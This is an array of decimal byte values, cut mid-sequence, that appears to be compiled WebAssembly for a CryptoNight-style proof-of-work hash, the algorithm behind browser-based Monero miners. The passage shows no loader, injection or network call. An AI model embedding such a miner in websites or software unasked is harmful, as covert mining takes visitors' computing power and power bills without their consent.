33,8,32,7,66,7,131,66,0,81,4,127,32,6,32,0,32,8,167,16,11,5,32,6,32,0,32,8,66,1,124,167,16,11,11,26,32,4,32,7,55,3,0,11,32,5,41,3,0,34,7,66,255,3,131,34,8,66,0,81,4,64,32,3,65,160,1,106,34,0,66,0,55,3,0,32,0,66,0,55,3,8,32,0,66,0,55,3,16,32,0,66,0,55,3,24,32,0,66,0,55,3,32,32,0,66,0,55,3,40,32,0,66,0,55,3,48,32,0,66,0,55,3,56,32,0,65,128,127,58,0,0,32,3,32,7,60,0,223,1,32,3,32,7,66,8,136,60,0,222,1,32,3,32,7,66,16,136,60,0,221,1,32,3,32,7,66,24,136,60,0,220,1,32,3,32,7,66,32,136,60,0,219,1,32,3,32,7,66,40,136,60,0,218,1,32,3,32,7,66,48,136,60,0,217,1,32,3,32,7,66,56,136,60,0,216,1,32,3,16,22,5,32,8,66,3,136,33,8,32,4,41,3,0,66,7,131,66,0,81,4,64,32,8,167,34,0,65,192,0,73,4,64,32,3,32,0,65,160,1,106,106,65,0,65,192,0,32,0,107,16,14,26,11,5,32,8,66,1,124,167,34,0,65,192,0,73,4,64,32,3,32,0,65,160,1,106,106,65,0,65,192,0,32,0,107,16,14,26,11,11,32,3,65,160,1,106,32,7,66,3,136,167,65,63,113,106,34,0,65,1,32,7,167,65,7,113,65,7,115,116,32,0,45,0,0,114,58,0,0,32,3,16,22,32,3,65,160,1,106,34,0,66,0,55,3,0,32,0,66,0,55,3,8,32,0,66,0,55,3,16,32,0,66,0,55,3,24,32,0,66,0,55,3,32,32,0,66,0,55,3,40,32,0,66,0,55,3,48,32,0,66,0,55,3,56,32,3,32,5,41,3,0,34,7,60,0,223,1,32,3,32,7,66,8,136,60,0,222,1,32,3,32,7,66,16,136,60,0,221,1,32,3,32,7,66,24,136,60,0,220,1,32,3,32,7,66,32,136,60,0,219,1,32,3,32,7,66,40,136,60,0,218,1,32,3,32,7,66,48,136,60,0,217,1,32,3,32,7,66,56,136,60,0,216,1,32,3,16,22,11,2,64,2,64,2,64,2,64,2,64,32,3,40,2,0,65,160,126,106,34,0,65,5,118,32,0,65,27,116,114,14,10,0,1,4,4,4,2,4,4,4,3,4,11,32,2,32,3,65,132,1,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,40,0,24,54,0,24,32,3,36,4,15,11,32,2,32,3,65,128,1,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,41,0,24,55,0,24,32,3,36,4,15,11,32,2,32,3,65,240,0,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,41,0,24,55,0,24,32,2,32,0,41,0,32,55,0,32,32,2,32,0,41,0,40,55,0,40,32,3,36,4,15,11,32,2,32,3,65,224,0,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,41,0,24,55,0,24,32,2,32,0,41,0,32,55,0,32,32,2,32,0,41,0,40,55,0,40,32,2,32,0,41,0,48,55,0,48,32,2,32,0,41,0,56,55,0,56,32,3,36,4,15,11,32,3,36,4,11,209,6,1,14,127,35,4,33,3,35,4,65,144,1,106,36,4,32,3,65,231,204,167,208,6,54,2,0,32,3,65,4,106,34,10,65,133,221,158,219,123,54,2,0,32,3,65,8,106,34,11,65,242,230,187,227,3,54,2,0,32,3,65,12,106,34,12,65,186,234,191,170,122,54,2,0,32,3,65,16,106,34,13,65,255,164,185,136,5,54,2,0,32,3,65,20,106,34,14,65,140,209,149,216,121,54,2,0,32,3,65,24,106,34,15,65,171,179,143,252,1,54,2,0,32,3,65,28,106,34,16,65,153,154,131,223,5,54,2,0,32,3,65,32,106,34,7,66,0,55,2,0,32,7,66,0,55,2,8,32,7,66,0,55,2,16,32,7,66,0,55,2,24,32,3,32,0,32,1,173,66,3,134,16,17,32,3,65,137,1,106,34,1,65,129,127,58,0,0,32,3,65,136,1,106,34,0,65,1,58,0,0,32,3,65,128,1,106,34,5,32,3,40,2,52,32,3,40,2,56,34,6,32,3,65,48,106,34,4,40,2,0,34,9,106,34,8,32,6,73,106,34,7,65,24,118,58,0,0,32,5,32,7,65,16,118,58,0,1,32,5,32,7,65,8,118,58,0,2,32,5,32,7,58,0,3,32,5,32,8,65,24,118,58,0,4,32,5,32,8,65,16,118,58,0,5,32,5,32,8,65,8,118,58,0,6,32,5,32,8,58,0,7,32,6,65,184,3,70,4,64,32,4,32,9,65,120,106,54,2,0,32,3,32,1,66,8,16,17,32,4,40,2,0,33,0,5,32,6,65,184,3,72,4,64,32,6,69,4,64,32,3,65,1,54,2,60,11,32,4,32,9,65,200,124,106,32,6,106,54,2,0,32,3,65,240,61,65,184,3,32,6,107,172,16,17,5,32,4,32,9,65,128,124,106,32,6,106,54,2,0,32,3,65,240,61,65,128,4,32,6,107,172,16,17,32,4,32,4,40,2,0,65,200,124,106,54,2,0,32,3,65,241,61,66,184,3,16,17,32,3,65,1,54,2,60,11,32,3,32,0,66,8,16,17,32,4,32,4,40,2,0,65,120,106,34,0,54,2,0,11,32,4,32,0,65,64,106,54,2,0,32,3,32,5,66,192,0,16,17,32,2,32,3,40,2,0,34,0,65,24,118,58,0,0,32,2,32,0,65,16,118,58,0,1,32,2,32,0,65,8,118,58,0,2,32,2,32,0,58,0,3,32,2,32,10,40,2,0,34,0,65,24,118,58,0,4,32,2,32,0,65,16,118,58,0,5,32,2,32,0,65,8,118,58,0,6,32,2,32,0,58,0,7,32,2,32,11,40,2,0,34,0,65,24,118,58,0,8,32,2,32,0,65,16,118,58,0,9,32,2,32,0,65,8,118,58,0,10,32,2,32,0,58,0,11,32,2,32,12,40,2,0,34,0,65,24,118,58,0,12,32,2,32,0,65,16,118,58,0,13,32,2,32,0,65,8,118,58,0,14,32,2,32,0,58,0,15,32,2,32,13,40,2,0,34,0,65,24,118,58,0,16,32,2,32,0,65,16,118,58,0,17,32,2,32,0,65,8,118,58,0,18,32,2,32,0,58,0,19,32,2,32,14,40,2,0,34,0,65,24,118,58,0,20,32,2,32,0,65,16,118,58,0,21,32,2,32,0,65,8,118,58,0,22,32,2,32,0,58,0,23,32,2,32,15,40,2,0,34,0,65,24,118,58,0,24,32,2,32,0,65,16,118,58,0,25,32,2,32,0,65,8,118,58,0,26,32,2,32,0,58,0,27,32,2,32,16,40,2,0,34,0,65,24,118,58,0,28,32,2,32,0,65,16,118,58,0,29,32,2,32,0,65,8,118,58,0,30,32,2,32,0,58,0,31,32,3,36,4,11,184,22,2,27,127,10,126,35,4,33,7,35,4,65,208,1,106,36,4,32,7,32,1,41,0,0,55,0,0,32,7,32,1,41,0,8,55,0,8,32,7,32,1,41,0,16,55,0,16,32,7,32,1,41,0,24,55,0,24,32,7,32,1,41,0,32,55,0,32,32,7,32,1,41,0,40,55,0,40,32,7,32,1,41,0,48,55,0,48,32,7,32,1,41,0,56,55,0,56,32,7,32,1,41,0,64,55,0,64,32,7,32,1,40,0,72,54,0,72,32,7,65,208,0,106,34,1,66,0,55,3,0,32,1,66,0,55,3,8,32,1,66,0,55,3,16,32,1,66,0,55,3,24,32,1,66,0,55,3,32,32,1,66,0,55,3,40,32,1,66,0,55,3,48,32,1,66,0,55,3,56,32,1,66,0,55,3,64,32,1,66,0,55,3,72,32,1,66,0,55,3,80,32,1,66,0,55,3,88,32,1,66,0,55,3,96,32,1,66,0,55,3,104,32,1,66,0,55,3,112,32,7,65,200,0,106,34,1,32,1,41,3,0,66,255,255,255,255,15,131,66,128,128,128,128,16,132,55,3,0,32,7,66,128,128,128,128,128,128,128,128,128,127,55,3,128,1,32,7,65,8,106,34,1,32,1,40,2,0,65,158,142,249,132,126,115,54,2,0,32,7,16,19,32,0,65,128,128,128,1,106,34,19,32,7,65,200,1,16,11,26,32,0,65,208,129,128,1,106,34,4,32,0,65,192,128,128,1,106,34,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,0,65,240,130,128,1,106,34,16,32,0,65,208,128,128,1,106,41,3,0,32,5,41,3,0,133,55,3,0,32,0,65,248,130,128,1,106,34,17,32,0,65,216,128,128,1,106,41,3,0,32,0,65,200,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,128,128,1,106,41,3,0,33,33,32,0,65,232,128,128,1,106,41,3,0,33,35,32,0,65,144,131,128,1,106,34,8,40,2,0,32,19,16,18,32,0,65,224,129,128,1,106,33,20,32,0,65,240,129,128,1,106,33,21,32,0,65,128,130,128,1,106,33,22,32,0,65,144,130,128,1,106,33,23,32,0,65,160,130,128,1,106,33,24,32,0,65,176,130,128,1,106,33,25,32,0,65,192,130,128,1,106,33,26,65,0,33,1,3,64,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,23,32,8,40,2,0,40,2,0,40,2,12,16,9,32,24,32,8,40,2,0,40,2,0,40,2,12,16,9,32,25,32,8,40,2,0,40,2,0,40,2,12,16,9,32,26,32,8,40,2,0,40,2,0,40,2,12,16,9,32,0,32,1,106,34,3,32,4,41,0,0,55,0,0,32,3,32,4,41,0,8,55,0,8,32,3,32,4,41,0,16,55,0,16,32,3,32,4,41,0,24,55,0,24,32,3,32,4,41,0,32,55,0,32,32,3,32,4,41,0,40,55,0,40,32,3,32,4,41,0,48,55,0,48,32,3,32,4,41,0,56,55,0,56,32,3,32,4,41,0,64,55,0,64,32,3,32,4,41,0,72,55,0,72,32,3,32,4,41,0,80,55,0,80,32,3,32,4,41,0,88,55,0,88,32,3,32,4,41,0,96,55,0,96,32,3,32,4,41,0,104,55,0,104,32,3,32,4,41,0,112,55,0,112,32,3,32,4,41,0,120,55,0,120,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,0,65,208,130,128,1,106,34,10,32,0,65,160,128,128,1,106,34,29,41,3,0,32,19,41,3,0,133,34,37,55,3,0,32,0,65,216,130,128,1,106,34,12,32,0,65,168,128,128,1,106,41,3,0,32,0,65,136,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,130,128,1,106,34,13,32,0,65,176,128,128,1,106,41,3,0,32,0,65,144,128,128,1,106,41,3,0,133,55,3,0,32,0,65,232,130,128,1,106,34,14,32,0,65,184,128,128,1,106,41,3,0,32,0,65,152,128,128,1,106,41,3,0,133,55,3,0,32,0,65,128,131,128,1,106,33,15,32,0,65,136,131,128,1,106,33,6,65,0,33,1,32,37,167,33,3,3,64,32,0,32,3,65,240,255,255,0,113,34,3,106,34,11,32,15,32,10,16,20,32,0,32,3,65,16,115,106,34,9,41,3,0,33,37,32,9,65,8,106,34,18,41,3,0,33,34,32,9,32,16,41,3,0,32,0,32,3,65,48,115,106,34,9,41,3,0,124,55,3,0,32,18,32,17,41,3,0,32,9,65,8,106,34,18,41,3,0,124,55,3,0,32,9,32,10,41,3,0,32,0,32,3,65,32,115,106,34,3,41,3,0,124,55,3,0,32,18,32,12,41,3,0,32,3,65,8,106,34,9,41,3,0,124,55,3,0,32,3,32,13,41,3,0,32,37,124,55,3,0,32,9,32,14,41,3,0,32,34,124,55,3,0,32,11,32,13,41,3,0,32,15,41,3,0,133,55,3,0,32,11,32,14,41,3,0,32,6,41,3,0,133,55,3,8,32,0,32,15,41,3,0,34,31,167,34,11,65,240,255,255,0,113,34,3,106,34,18,65,8,106,34,30,41,3,0,33,39,32,6,41,3,0,34,37,32,35,167,65,1,116,32,11,106,65,129,128,128,128,120,114,173,34,34,130,66,32,134,32,37,32,34,128,66,255,255,255,255,15,131,132,34,37,32,31,124,34,32,186,68,0,0,0,0,0,0,240,67,160,159,68,0,0,0,0,0,0,0,64,162,68,0,0,0,0,0,0,0,194,160,177,34,34,66,1,136,34,36,32,34,66,1,131,34,38,124,32,36,126,32,34,66,32,134,124,34,40,32,38,124,32,32,86,65,31,116,65,31,117,32,40,66,128,128,128,128,16,124,32,32,32,36,125,84,106,172,32,34,124,33,34,32,35,66,32,134,32,33,133,32,18,41,3,0,133,34,35,66,32,136,34,36,32,31,66,255,255,255,255,15,131,34,32,126,33,33,32,35,66,255,255,255,255,15,131,34,38,32,32,126,33,32,32,33,32,38,32,31,66,32,136,34,38,126,124,32,32,66,32,136,124,34,31,66,32,136,32,36,32,38,126,124,32,31,32,33,84,173,66,32,134,124,34,36,32,0,32,3,65,16,115,106,34,11,41,3,0,133,33,33,32,11,32,33,55,3,0,32,11,65,8,106,34,27,41,3,0,32,31,66,32,134,32,32,66,255,255,255,255,15,131,132,34,32,133,33,31,32,27,32,31,55,3,0,32,0,32,3,65,32,115,106,34,9,41,3,0,32,36,133,33,36,32,9,65,8,106,34,28,41,3,0,32,32,133,33,32,32,11,32,16,41,3,0,32,0,32,3,65,48,115,106,34,3,41,3,0,124,55,3,0,32,27,32,17,41,3,0,32,3,65,8,106,34,11,41,3,0,124,55,3,0,32,3,32,10,41,3,0,32,9,41,3,0,124,55,3,0,32,11,32,12,41,3,0,32,28,41,3,0,124,55,3,0,32,9,32,13,41,3,0,32,33,124,55,3,0,32,28,32,14,41,3,0,32,31,124,55,3,0,32,10,32,10,41,3,0,32,36,124,34,33,55,3,0,32,12,32,12,41,3,0,32,32,124,34,31,55,3,0,32,18,32,33,55,3,0,32,30,32,31,55,3,0,32,10,32,10,41,3,0,32,35,133,34,35,55,3,0,32,12,32,12,41,3,0,32,39,133,55,3,0,32,16,32,13,41,3,0,55,3,0,32,17,32,14,41,3,0,55,3,0,32,13,32,15,41,3,0,55,3,0,32,14,32,6,41,3,0,55,3,0,32,35,167,33,3,32,1,65,1,106,34,1,65,128,128,32,71,4,64,32,37,33,33,32,34,33,35,12,1,11,11,32,4,32,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,8,40,2,0,32,29,16,18,32,0,65,216,129,128,1,106,33,3,32,0,65,232,129,128,1,106,33,10,32,0,65,248,129,128,1,106,33,12,32,0,65,136,130,128,1,106,33,13,32,0,65,152,130,128,1,106,33,14,32,0,65,168,130,128,1,106,33,15,32,0,65,184,130,128,1,106,33,16,32,0,65,200,130,128,1,106,33,17,65,0,33,1,3,64,32,4,32,4,41,3,0,32,0,32,1,106,34,6,41,3,0,133,55,3,0,32,3,32,3,41,3,0,32,6,41,3,8,133,55,3,0,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,20,41,3,0,32,0,32,1,65,16,114,106,34,6,41,3,0,133,55,3,0,32,10,32,10,41,3,0,32,6,41,3,8,133,55,3,0,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,21,41,3,0,32,0,32,1,65,32,114,106,34,6,41,3,0,133,55,3,0,32,12,32,12,41,3,0,32,6,41,3,8,133,55,3,0,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,22,41,3,0,32,0,32,1,65,48,114,106,34,6,41,3,0,133,55,3,0,32,13,32,13,41,3,0,32,6,41,3,8,133,55,3,0,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,23,32,23,41,3,0,32,0,32,1,65,192,0,114,106,34,6,41,3,0,133,55,3,0,32,14,32,14,41,3,0,32,6,41,3,8,133,55,3,0,32,23,32,8,40,2,0,40,2,0,40,2,12,16,9,32,24,32,24,41,3,0,32,0,32,1,65,208,0,114,106,34,6,41,3,0,133,55,3,0,32,15,32,15,41,3,0,32,6,41,3,8,133,55,3,0,32,24,32,8,40,2,0,40,2,0,40,2,12,16,9,32,25,32,25,41,3,0,32,0,32,1,65,224,0,114,106,34,6,41,3,0,133,55,3,0,32,16,32,16,41,3,0,32,6,41,3,8,133,55,3,0,32,25,32,8,40,2,0,40,2,0,40,2,12,16,9,32,26,32,26,41,3,0,32,0,32,1,65,240,0,114,106,34,6,41,3,0,133,55,3,0,32,17,32,17,41,3,0,32,6,41,3,8,133,55,3,0,32,26,32,8,40,2,0,40,2,0,40,2,12,16,9,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,5,32,4,41,3,0,55,3,0,32,5,32,4,41,3,8,55,3,8,32,5,32,4,41,3,16,55,3,16,32,5,32,4,41,3,24,55,3,24,32,5,32,4,41,3,32,55,3,32,32,5,32,4,41,3,40,55,3,40,32,5,32,4,41,3,48,55,3,48,32,5,32,4,41,3,56,55,3,56,32,5,32,4,41,3,64,55,3,64,32,5,32,4,41,3,72,55,3,72,32,5,32,4,41,3,80,55,3,80,32,5,32,4,41,3,88,55,3,88,32,5,32,4,41,3,96,55,3,96,32,5,32,4,41,3,104,55,3,104,32,5,32,4,41,3,112,55,3,112,32,5,32,4,41,3,120,55,3,120,32,19,16,19,32,19,65,200,1,32,2,32,19,44,0,0,65,3,113,65,2,116,65,128,42,106,40,2,0,65,7,113,17,0,0,32,7,36,4,11,139,20,2,20,127,7,126,35,4,33,3,35,4,65,208,1,106,36,4,32,3,32,1,41,0,0,55,0,0,32,3,32,1,41,0,8,55,0,8,32,3,32,1,41,0,16,55,0,16,32,3,32,1,41,0,24,55,0,24,32,3,32,1,41,0,32,55,0,32,32,3,32,1,41,0,40,55,0,40,32,3,32,1,41,0,48,55,0,48,32,3,32,1,41,0,56,55,0,56,32,3,32,1,41,0,64,55,0,64,32,3,32,1,40,0,72,54,0,72,32,3,65,208,0,106,34,4,66,0,55,3,0,32,4,66,0,55,3,8,32,4,66,0,55,3,16,32,4,66,0,55,3,24,32,4,66,0,55,3,32,32,4,66,0,55,3,40,32,4,66,0,55,3,48,32,4,66,0,55,3,56,32,4,66,0,55,3,64,32,4,66,0,55,3,72,32,4,66,0,55,3,80,32,4,66,0,55,3,88,32,4,66,0,55,3,96,32,4,66,0,55,3,104,32,4,66,0,55,3,112,32,3,65,200,0,106,34,4,32,4,41,3,0,66,255,255,255,255,15,131,66,128,128,128,128,16,132,55,3,0,32,3,66,128,128,128,128,128,128,128,128,128,127,55,3,128,1,32,3,65,8,106,34,4,32,4,40,2,0,65,158,142,249,132,126,115,54,2,0,32,3,16,19,32,0,65,128,128,128,1,106,34,13,32,3,65,200,1,16,11,26,32,0,65,208,129,128,1,106,34,4,32,0,65,192,128,128,1,106,34,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,0,65,192,129,128,1,106,41,3,0,33,29,32,1,41,3,35,33,24,32,0,65,144,131,128,1,106,34,9,40,2,0,32,13,16,18,32,0,65,224,129,128,1,106,33,16,32,0,65,240,129,128,1,106,33,17,32,0,65,128,130,128,1,106,33,18,32,0,65,144,130,128,1,106,33,19,32,0,65,160,130,128,1,106,33,20,32,0,65,176,130,128,1,106,33,21,32,0,65,192,130,128,1,106,33,22,65,0,33,1,3,64,32,4,32,9,40,2,0,40,2,0,40,2,12,16,9,32,16,32,9,40,2,0,40,2,0,40,2,12,16,9,32,17,32,9,40,2,0,40,2,0,40,2,12,16,9,32,18,32,9,40,2,0,40,2,0,40,2,12,16,9,32,19,32,9,40,2,0,40,2,0,40,2,12,16,9,32,20,32,9,40,2,0,40,2,0,40,2,12,16,9,32,21,32,9,40,2,0,40,2,0,40,2,12,16,9,32,22,32,9,40,2,0,40,2,0,40,2,12,16,9,32,0,32,1,106,34,6,32,4,41,0,0,55,0,0,32,6,32,4,41,0,8,55,0,8,32,6,32,4,41,0,16,55,0,16,32,6,32,4,41,0,24,55,0,24,32,6,32,4,41,0,32,55,0,32,32,6,32,4,41,0,40,55,0,40,32,6,32,4,41,0,48,55,0,48,32,6,32,4,41,0,56,55,0,56,32,6,32,4,41,0,64,55,0,64,32,6,32,4,41,0,72,55,0,72,32,6,32,4,41,0,80,55,0,80,32,6,32,4,41,0,88,55,0,88,32,6,32,4,41,0,96,55,0,96,32,6,32,4,41,0,104,55,0,104,32,6,32,4,41,0,112,55,0,112,32,6,32,4,41,0,120,55,0,120,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,24,32,29,133,33,29,32,0,65,208,130,128,1,106,34,6,32,0,65,160,128,128,1,106,34,23,41,3,0,32,13,41,3,0,133,34,24,55,3,0,32,0,65,216,130,128,1,106,34,12,32,0,65,168,128,128,1,106,41,3,0,32,0,65,136,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,130,128,1,106,34,10,32,0,65,176,128,128,1,106,41,3,0,32,0,65,144,128,128,1,106,41,3,0,133,55,3,0,32,0,65,232,130,128,1,106,34,14,32,0,65,184,128,128,1,106,41,3,0,32,0,65,152,128,128,1,106,41,3,0,133,55,3,0,32,0,65,128,131,128,1,106,33,11,32,0,65,136,131,128,1,106,33,15,65,0,33,1,32,24,167,33,7,3,64,32,0,32,7,65,240,255,255,0,113,106,34,7,32,11,32,6,16,20,32,7,32,10,41,3,0,32,11,41,3,0,133,55,3,0,32,7,32,14,41,3,0,32,15,41,3,0,133,34,24,55,3,8,32,7,65,144,166,29,32,24,66,27,136,167,65,6,113,32,24,66,24,136,167,34,7,65,1,113,114,65,1,116,118,65,48,113,32,7,115,58,0,11,32,11,41,3,0,34,26,66,32,136,33,24,32,0,32,11,40,2,0,65,240,255,255,0,113,106,34,7,41,3,0,34,28,66,32,136,34,30,32,26,66,255,255,255,255,15,131,34,25,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,25,126,33,25,32,26,32,27,32,24,126,124,32,25,66,32,136,124,34,27,66,32,134,32,25,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,25,32,6,32,6,41,3,0,32,30,32,24,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,24,32,28,133,55,3,0,32,12,32,25,32,7,65,8,106,34,8,41,3,0,133,55,3,0,32,7,32,24,55,3,0,32,8,32,25,32,29,133,55,3,0,32,0,32,6,40,2,0,65,240,255,255,0,113,106,34,7,32,10,32,6,16,20,32,7,32,11,41,3,0,32,10,41,3,0,133,55,3,0,32,7,32,15,41,3,0,32,14,41,3,0,133,34,24,55,3,8,32,7,65,144,166,29,32,24,66,27,136,167,65,6,113,32,24,66,24,136,167,34,7,65,1,113,114,65,1,116,118,65,48,113,32,7,115,58,0,11,32,10,41,3,0,34,26,66,32,136,33,24,32,0,32,10,40,2,0,65,240,255,255,0,113,106,34,7,41,3,0,34,28,66,32,136,34,30,32,26,66,255,255,255,255,15,131,34,25,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,25,126,33,25,32,26,32,27,32,24,126,124,32,25,66,32,136,124,34,27,66,32,134,32,25,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,25,32,6,32,6,41,3,0,32,30,32,24,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,24,32,28,133,55,3,0,32,12,32,25,32,7,65,8,106,34,8,41,3,0,133,55,3,0,32,7,32,24,55,3,0,32,8,32,25,32,29,133,55,3,0,32,1,65,1,106,34,1,65,128,128,16,71,4,64,32,6,40,2,0,33,7,12,1,11,11,32,4,32,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,9,40,2,0,32,23,16,18,32,0,65,216,129,128,1,106,33,6,32,0,65,232,129,128,1,106,33,10,32,0,65,248,129,128,1,106,33,11,32,0,65,136,130,128,1,106,33,12,32,0,65,152,130,128,1,106,33,7,32,0,65,168,130,128,1,106,33,14,32,0,65,184,130,128,1,106,33,15,32,0,65,200,130,128,1,106,33,23,65,0,33,1,3,64,32,4,32,4,41,3,0,32,0,32,1,106,34,8,41,3,0,133,55,3,0,32,6,32,6,41,3,0,32,8,41,3,8,133,55,3,0,32,4,32,9,40,2,0,40,2,0,40,2,12,16,9,32,16,32,16,41,3,0,32,0,32,1,65,16,114,106,34,8,41,3,0,133,55,3,0,32,10,32,10,41,3,0,32,8,41,3,8,133,55,3,0,32,16,32,9,40,2,0,40,2,0,40,2,12,16,9,32,17,32,17,41,3,0,32,0,32,1,65,32,114,106,34,8,41,3,0,133,55,3,0,32,11,32,11,41,3,0,32,8,41,3,8,133,55,3,0,32,17,32,9,40,2,0,40,2,0,40,2,12,16,9,32,18,32,18,41,3,0,32,0,32,1,65,48,114,106,34,8,41,3,0,133,55,3,0,32,12,32,12,41,3,0,32,8,41,3,8,133,55,3,0,32,18,32,9,40,2,0,40,2,0,40,2,12,16,9,32,19,32,19,41,3,0,32,0,32,1,65,192,0,114,106,34,8,41,3,0,133,55,3,0,32,7,32,7,41,3,0,32,8,41,3,8,133,55,3,0,32,19,32,9,40,2,0,40,2,0,40,2,12,16,9,32,20,32,20,41,3,0,32,0,32,1,65,208,0,114,106,34,8,41,3,0,133,55,3,0,32,14,32,14,41,3,0,32,8,41,3,8,133,55,3,0,32,20,32,9,40,2,0,40,2,0,40,2,12,16,9,32,21,32,21,41,3,0,32,0,32,1,65,224,0,114,106,34,8,41,3,0,133,55,3,0,32,15,32,15,41,3,0,32,8,41,3,8,133,55,3,0,32,21,32,9,40,2,0,40,2,0,40,2,12,16,9,32,22,32,22,41,3,0,32,0,32,1,65,240,0,114,106,34,8,41,3,0,133,55,3,0,32,23,32,23,41,3,0,32,8,41,3,8,133,55,3,0,32,22,32,9,40,2,0,40,2,0,40,2,12,16,9,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,5,32,4,41,3,0,55,3,0,32,5,32,4,41,3,8,55,3,8,32,5,32,4,41,3,16,55,3,16,32,5,32,4,41,3,24,55,3,24,32,5,32,4,41,3,32,55,3,32,32,5,32,4,41,3,40,55,3,40,32,5,32,4,41,3,48,55,3,48,32,5,32,4,41,3,56,55,3,56,32,5,32,4,41,3,64,55,3,64,32,5,32,4,41,3,72,55,3,72,32,5,32,4,41,3,80,55,3,80,32,5,32,4,41,3,88,55,3,88,32,5,32,4,41,3,96,55,3,96,32,5,32,4,41,3,104,55,3,104,32,5,32,4,41,3,112,55,3,112,32,5,32,4,41,3,120,55,3,120,32,13,16,19,32,13,65,200,1,32,2,32,13,44,0,0,65,3,113,65,2,116,65,128,42,106,40,2,0,65,7,113,17,0,0,32,3,36,4,11,128,19,2,20,127,6,126,35,4,33,3,35,4,65,208,1,106,36,4,32,3,32,1,41,0,0,55,0,0,32,3,32,1,41,0,8,55,0,8,32,3,32,1,41,0,16,55,0,16,32,3,32,1,41,0,24,55,0,24,32,3,32,1,41,0,32,55,0,32,32,3,32,1,41,0,40,55,0,40,32,3,32,1,41,0,48,55,0,48,32,3,32,1,41,0,56,55,0,56,32,3,32,1,41,0,64,55,0,64,32,3,32,1,40,0,72,54,0,72,32,3,65,208,0,106,34,1,66,0,55,3,0,32,1,66,0,55,3,8,32,1,66,0,55,3,16,32,1,66,0,55,3,24,32,1,66,0,55,3,32,32,1,66,0,55,3,40,32,1,66,0,55,3,48,32,1,66,0,55,3,56,32,1,66,0,55,3,64,32,1,66,0,55,3,72,32,1,66,0,55,3,80,32,1,66,0,55,3,88,32,1,66,0,55,3,96,32,1,66,0,55,3,104,32,1,66,0,55,3,112,32,3,65,200,0,106,34,1,32,1,41,3,0,66,255,255,255,255,15,131,66,128,128,128,128,16,132,55,3,0,32,3,66,128,128,128,128,128,128,128,128,128,127,55,3,128,1,32,3,16,19,32,0,65,128,128,128,1,106,34,13,32,3,65,200,1,16,11,26,32,0,65,208,129,128,1,106,34,4,32,0,65,192,128,128,1,106,34,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,